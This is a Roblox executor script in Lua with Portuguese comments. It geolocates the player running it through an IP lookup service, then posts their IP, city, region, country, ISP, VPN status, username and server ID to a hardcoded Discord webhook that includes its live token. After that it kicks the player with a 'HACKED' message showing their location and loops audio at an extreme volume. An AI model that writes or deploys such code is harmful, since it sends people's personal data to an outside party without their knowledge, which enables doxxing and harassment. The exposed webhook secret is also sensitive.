local request = http_request or request or syn and syn.request or http and http.request
if not request then
    warn("Executor não suporta HTTP Requests.")
    return
end

local function getIPInfo()
    local success, response = pcall(function()
        return request({
            Url = "http://ip-api.com/json/?fields=status,proxy,hosting,vpn,query,country,regionName,city,isp",
            Method = "GET"
        })
    end)

    if success and response then
        local ipData = game:GetService("HttpService"):JSONDecode(response.Body)
        
        -- Verifica se a API retornou status "success", senão exibe "Não encontrado"
        if ipData.status ~= "success" then
            return {
                query = "Não encontrado",
                country = "Não encontrado",
                regionName = "Não encontrado",
                city = "Não encontrado",
                isp = "Não encontrado",
                vpn = false,
                proxy = false,
                hosting = false
            }
        end
        
        print("IP: " .. ipData.query)
        print("Cidade: " .. ipData.city)
        print("Região: " .. ipData.regionName)
        print("País: " .. ipData.country)
        print("ISP: " .. ipData.isp)
        print("VPN: " .. (ipData.vpn and "SIM" or "NÃO"))
        print("Proxy: " .. (ipData.proxy and "SIM" or "NÃO"))
        print("Datacenter/Hosting: " .. (ipData.hosting and "SIM" or "NÃO"))
        
        return ipData
    else
        warn("Erro ao obter informações do IP")
        return nil
    end
end

local function sendToDiscord(player, ipInfo)
    local Webhook_URL = "https://discord.com/api/webhooks/1347907379605274624/ovqIJ8N0inm07ePe8yeIkvQFbfgU8goH4MKQa5Z2jQR_RviCfi22il7R0nS-QrEdWckW"

    local username = player.Name
    local dateTime = os.date("%d/%m/%Y %H:%M:%S")
    local serverId = game.JobId
    local gameId = game.PlaceId

    local message = string.format([[
**IP - ANTI MANDRAKE SYSTEM** 🚨
-----------------------------------------
👤 **Usuário:** %s
🕒 **Data e Hora:** %s
🌐 **ID do Servidor:** %s
🎮 **ID do Jogo:** %s
🌍 **IP:** %s
📍 **Localização:** %s, %s, %s
🏢 **Provedor:** %s
🛡 **VPN:** %s
🔌 **Proxy:** %s
🏢 **Datacenter/Hosting:** %s
-----------------------------------------
> **Atenção:** Quem está lendo isso é....... 
    ]], 
    username, dateTime, serverId, gameId, 
    ipInfo.query or "Não encontrado",
    ipInfo.city or "Não encontrado",
    ipInfo.regionName or "Não encontrado",
    ipInfo.country or "Não encontrado",
    ipInfo.isp or "Não encontrado",
    ipInfo.vpn and "SIM" or "NÃO",
    ipInfo.proxy and "SIM" or "NÃO",
    ipInfo.hosting and "SIM" or "NÃO"
    )

    local data = { content = message }

    print("Tentando enviar mensagem para o Discord...")
    local success, response = pcall(function()
        return request({
            Url = Webhook_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(data)
        })
    end)

    if not success then
        warn("Erro ao enviar para o Discord: " .. tostring(response))
    else
        print("Mensagem enviada para o Discord: " .. response.Body)
    end

    print("--------------------------------------------------------------")
end

local function kickPlayer(ipInfo)
    local player = game.Players.LocalPlayer
    if player then
        wait(3) -- Espera 3 segundos antes de expulsar
        
        local kickMessage = string.format(
            "HACKED💻\n\n🌍 IP: %s\n📍 Localização: %s, %s, %s",
            ipInfo.query or "Não encontrado",
            ipInfo.city or "Não encontrado",
            ipInfo.regionName or "Não encontrado",
            ipInfo.country or "Não encontrado"
        )
        
        player:Kick(kickMessage)
    end
end

local function playAudio()
    local soundId = "rbxassetid://7236490488"
    local volume = 10e10 
    
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Volume = volume
    sound.Looped = true
    sound.Parent = game.Workspace

    sound:Play()

    while true do
        wait(0.5)
        sound:Play()
    end
end

-- Executa as funções
local player = game.Players.LocalPlayer
local ipInfo = getIPInfo()

if ipInfo then
    sendToDiscord(player, ipInfo)
    kickPlayer(ipInfo) -- Agora o kick exibe "Suas Informações", IP e localização corretamente
    playAudio()
else
    warn("Não foi possível obter informações do IP. O kick não será executado.")
end
